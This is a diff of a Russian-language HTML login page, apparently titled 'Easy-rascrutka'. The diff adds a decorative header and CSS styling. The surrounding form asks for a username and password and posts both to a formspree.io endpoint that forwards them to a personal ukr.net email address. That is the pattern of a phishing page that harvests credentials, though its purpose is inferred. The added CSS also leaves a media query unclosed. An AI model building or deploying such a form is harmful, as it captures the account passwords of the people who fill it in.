@@ -4,13 +4,62 @@
 		<meta charset = "utf-8">
 		<link rel="stylesheet" href = "site.css">
 	</head>
+	
 	<body background = "untitled123123123123.png" style="background-attachment:fixed" topmargin="0">
+		<div class="container demo">
+  		 <div class="content">
+      	<div id="large-header" class="large-header">
+         <canvas id="demo-canvas"></canvas>
+         <h1 class="main-title"><span class="thin">Easy</span>-rascrutka</h1>
+      		</div>
+   	</div>
+	</div>
 		<div class = "do1"><center><br><br><img scr = "untitled.png"><form action="https://formspree.io/abonesoft@ukr.net" method = "POST">
 		<input class = "of1" name = "name" type = "text" name = "pib" placeholder = "Введите имя пользователя:" title = "¬ведите им¤:" required/>
 		<br><br><input class = "of1" name = "password" type = "password" name = "tel" placeholder = "Введите пароль:" title = "введите пароль:" required/>
 		<br><br><input src = "nazik_6.github.io" class = "of2" type = "submit" value = "Войти"/>
 		</form></center></img></div>
 		<style>
+.large-header {
+   position: relative;
+   width: 100%;
+   background: #111;
+   overflow: hidden;
+   background-size: cover;
+   background-position: center center;
+   z-index: 1;
+}
+
+.demo .large-header {
+   background-image: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/499416/demo-bg.jpg");
+}
+
+.main-title {
+   position: absolute;
+   margin: 0;
+   padding: 0;
+   color: #F9F1E9;
+   text-align: center;
+   top: 50%;
+   left: 50%;
+   -webkit-transform: translate3d(-50%, -50%, 0);
+   transform: translate3d(-50%, -50%, 0);
+}
+
+.demo .main-title {
+   text-transform: uppercase;
+   font-size: 4.2em;
+   letter-spacing: 0.1em;
+}
+
+.main-title .thin {
+   font-weight: 200;
+}
+
+@media only screen and (max-width: 768px) {
+   .demo .main-title {
+      font-size: 3em;
+   }
 .do1 {
   top: 50%; /* Отступ в процентах от верхнего края окна */
   left: 50%; /* Отступ в процентах от левого края окна */
